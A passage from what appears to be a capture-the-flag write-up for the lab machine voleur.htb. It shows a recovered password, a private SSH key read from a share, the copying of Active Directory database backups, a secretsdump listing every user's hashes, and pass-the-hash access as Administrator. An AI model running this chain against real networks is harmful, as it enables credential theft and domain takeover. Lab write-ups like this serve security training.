Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

## Privilege Escalation (svc_backup)

### Third-Line Support

```bash
└─$ faketime -f +8h impacket-getTGT 'voleur.htb'/'jeremy.combs':'qT3V9pLXyN7W4m' -dc-ip 10.10.11.76
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in jeremy.combs.ccache

└─$ export KRB5CCNAME=$(readlink -f jeremy.combs.ccache)

└─$ faketime -f +8h impacket-smbclient dc.voleur.htb -dc-ip 10.10.11.76 -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use IT
# tree
/Third-Line Support/id_rsa
/Third-Line Support/Note.txt.txt
Finished - 3 files and folders
# cat ./Third-Line Support/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

# cat /Third-Line Support/Note.txt.txt
Jeremy,
I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
Please see what you can set up.
Thanks,
Admin
# get ./Third-Line Support/id_rsa
# get /Third-Line Support/Note.txt.txt
# exit
```

```bash
└─$ chmod 600 id_rsa
└─$ ssh-keygen -lf id_rsa
3072 SHA256:+SJo12eqmKss6G70Hv3/wPrD2rXK9QY7fg8uUrxUeUw svc_backup@DC (RSA)
```

## SSH (2222)

```bash
└─$ ssh -i id_rsa svc_backup@dc.voleur.htb -p 2222
svc_backup@DC:~$ id
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
```

### Mount

There's whole C drive attached on `/mnt`
```bash
svc_backup@DC:/$ findmnt
TARGET                       SOURCE      FSTYPE      OPTIONS
/                            rootfs      wslfs       rw,noatime
├─/dev                       none        tmpfs       rw,noatime,mode=755
│ └─/dev/pts                 devpts      devpts      rw,nosuid,noexec,noatime,gid=5,mode=620
├─/sys                       sysfs       sysfs       rw,nosuid,nodev,noexec,noatime
│ └─/sys/fs/cgroup           tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,mode=755
│   └─/sys/fs/cgroup/devices cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,devices
├─/proc                      proc        proc        rw,nosuid,nodev,noexec,noatime
│ └─/proc/sys/fs/binfmt_misc binfmt_misc binfmt_misc rw,relatime
├─/run                       none        tmpfs       rw,nosuid,noexec,noatime,mode=755
│ ├─/run/lock                none        tmpfs       rw,nosuid,nodev,noexec,noatime
│ ├─/run/shm                 none        tmpfs       rw,nosuid,nodev,noatime
│ └─/run/user                none        tmpfs       rw,nosuid,nodev,noexec,noatime,mode=755
└─/mnt/c                     C:\         drvfs       rw,noatime,uid=1000,gid=1000,case=off
svc_backup@DC:/mnt/c$ ls -l 2>/dev/null
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:39 '$Recycle.Bin'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun 30 14:08 '$WinREAgent'
lrwxrwxrwx 1 svc_backup svc_backup   12 Jan 28 20:34 'Documents and Settings' -> /mnt/c/Users
-????????? ? ?          ?             ?            ?  DumpStack.log.tmp
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  Finance
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  HR
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 29 01:10  IT
d--x--x--x 1 svc_backup svc_backup 4096 May  8  2021  PerfLogs
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 06:20 'Program Files'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 05:53 'Program Files (x86)'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jun  4 15:34  ProgramData
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 28 20:34  Recovery
d--x--x--x 1 svc_backup svc_backup 4096 Jan 30 03:49 'System Volume Information'
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30 03:38  Users
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jun  5 12:53  Windows
dr-xr-xr-x 1 svc_backup svc_backup 4096 May 29 15:07  inetpub
-????????? ? ?          ?             ?            ?  pagefile.sys
```

### Secretsdump

There's 1 more directory in same SMB share Jeremy had access to.
```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls -alh
total 4.0K
dr-xr-xr-x 1 svc_backup svc_backup 4.0K Jan 30 08:11 .
dr-xr-xr-x 1 svc_backup svc_backup 4.0K Jan 29 01:10 ..
drwxrwxrwx 1 svc_backup svc_backup 4.0K Jan 30 08:11 Backups
-r-xr-xr-x 1 svc_backup svc_backup  186 Jan 30 08:07 Note.txt.txt
-r-xr-xr-x 1 svc_backup svc_backup 2.6K Jan 30 08:10 id_rsa

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ find -type f -ls
1688849860363937  24576 -rwxrwxrwx   1 svc_backup svc_backup 25165824 Jan 30 03:49 ./Active\ Directory/ntds.dit
1407374883653279     16 -rwxrwxrwx   1 svc_backup svc_backup    16384 Jan 30 03:49 ./Active\ Directory/ntds.jfm
1125899906942634     32 -rwxrwxrwx   1 svc_backup svc_backup    32768 Jan 30 03:30 ./registry/SECURITY
1688849860363938  17920 -rwxrwxrwx   1 svc_backup svc_backup 18350080 Jan 30 03:30 ./registry/SYSTEM
```

Download files
```bash
└─$ scp -i ./level3/id_rsa -P 2222 -r svc_backup@dc.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/' .
```

```bash
└─$ impacket-secretsdump -system './registry/SYSTEM' -security './registry/SECURITY' -ntds './Active Directory/ntds.dit' LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ./Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ./Active Directory/ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

NTLM password for Administrator works
```bash
└─$ faketime -f +8h netexec smb dc.voleur.htb -u 'Administrator' -H 'e656e07c56d831611b577b160b259ad2' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
```

### Root.txt

```bash
└─$ faketime -f +8h netexec smb dc.voleur.htb -u 'Administrator' -H 'e656e07c56d831611b577b160b259ad2' -k -x 'type \Users\Administrator\Desktop\root.txt'
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
SMB         dc.voleur.htb   445    dc               [+] Executed command via wmiexec
SMB         dc.voleur.htb   445    dc               3e63c08176fa07d4ae1d9b48656e1f67
```